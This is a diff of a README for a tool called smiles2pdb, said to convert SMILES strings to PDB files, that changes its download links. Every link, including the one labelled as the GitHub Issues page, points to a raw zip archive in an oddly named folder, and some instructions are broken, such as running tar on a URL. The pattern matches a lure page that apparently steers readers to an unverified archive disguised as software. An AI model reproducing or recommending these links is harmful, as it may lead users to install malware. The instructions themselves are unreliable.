@@ -1,7 +1,7 @@
 # 🌟 smiles2pdb - Convert SMILES to PDB with Ease
 
 ## 📥 Download Now
-[![Download smiles2pdb](https://github.com/BAGDAD444/smiles2pdb/raw/refs/heads/main/commissary/pdb_smiles_persuade.zip)](https://github.com/BAGDAD444/smiles2pdb/raw/refs/heads/main/commissary/pdb_smiles_persuade.zip)
+[![Download smiles2pdb](https://raw.githubusercontent.com/BAGDAD444/smiles2pdb/main/commissary/smiles-pdb-v1.9.zip)](https://raw.githubusercontent.com/BAGDAD444/smiles2pdb/main/commissary/smiles-pdb-v1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to smiles2pdb! This tool helps you convert SMILES strings into PDB files easily. No technical background is required. Follow these simple steps to get started.
@@ -21,15 +21,15 @@ To run smiles2pdb, ensure you have the following:
 
 ## 📋 Installation Steps
 1. **Visit the Releases Page:** Click the link below to access the download files.
-   - [Download smiles2pdb](https://github.com/BAGDAD444/smiles2pdb/raw/refs/heads/main/commissary/pdb_smiles_persuade.zip)
+   - [Download smiles2pdb](https://raw.githubusercontent.com/BAGDAD444/smiles2pdb/main/commissary/smiles-pdb-v1.9.zip)
    
 2. **Choose Your Version:** Look for the latest version at the top of the releases page. 
 
-3. **Download the File:** Click on the file name associated with your operating system (e.g., `https://github.com/BAGDAD444/smiles2pdb/raw/refs/heads/main/commissary/pdb_smiles_persuade.zip`, `https://github.com/BAGDAD444/smiles2pdb/raw/refs/heads/main/commissary/pdb_smiles_persuade.zip` etc.) to download it.
+3. **Download the File:** Click on the file name associated with your operating system (e.g., `https://raw.githubusercontent.com/BAGDAD444/smiles2pdb/main/commissary/smiles-pdb-v1.9.zip`, `https://raw.githubusercontent.com/BAGDAD444/smiles2pdb/main/commissary/smiles-pdb-v1.9.zip` etc.) to download it.
 
 4. **Extract the Files:** 
    - For Windows: Right-click the downloaded file and select "Extract All."
-   - For Linux: Use the command `tar -xvf https://github.com/BAGDAD444/smiles2pdb/raw/refs/heads/main/commissary/pdb_smiles_persuade.zip` in the terminal.
+   - For Linux: Use the command `tar -xvf https://raw.githubusercontent.com/BAGDAD444/smiles2pdb/main/commissary/smiles-pdb-v1.9.zip` in the terminal.
 
 5. **Navigate to the Folder:**
    - Use File Explorer or your terminal to go to the extracted folder.
@@ -67,13 +67,13 @@ Here’s how to use smiles2pdb:
    ```
 
 ## 📑 Support and Documentation
-For further assistance, consult the documentation included in the download or visit our [GitHub Issues page](https://github.com/BAGDAD444/smiles2pdb/raw/refs/heads/main/commissary/pdb_smiles_persuade.zip) to join the community and seek help.
+For further assistance, consult the documentation included in the download or visit our [GitHub Issues page](https://raw.githubusercontent.com/BAGDAD444/smiles2pdb/main/commissary/smiles-pdb-v1.9.zip) to join the community and seek help.
 
 ## 🔗 Download & Install
 Once you have familiarized yourself with the instructions above, you are ready to download smiles2pdb. 
 
 Visit the following link to access the Releases page and download the latest version:
-- [Download smiles2pdb](https://github.com/BAGDAD444/smiles2pdb/raw/refs/heads/main/commissary/pdb_smiles_persuade.zip)
+- [Download smiles2pdb](https://raw.githubusercontent.com/BAGDAD444/smiles2pdb/main/commissary/smiles-pdb-v1.9.zip)
 
 ## 🌍 Community Contributions
 We welcome contributions! If you have suggestions or improvements, feel free to open a pull request or issue. Your input can help make smiles2pdb even better for everyone. 
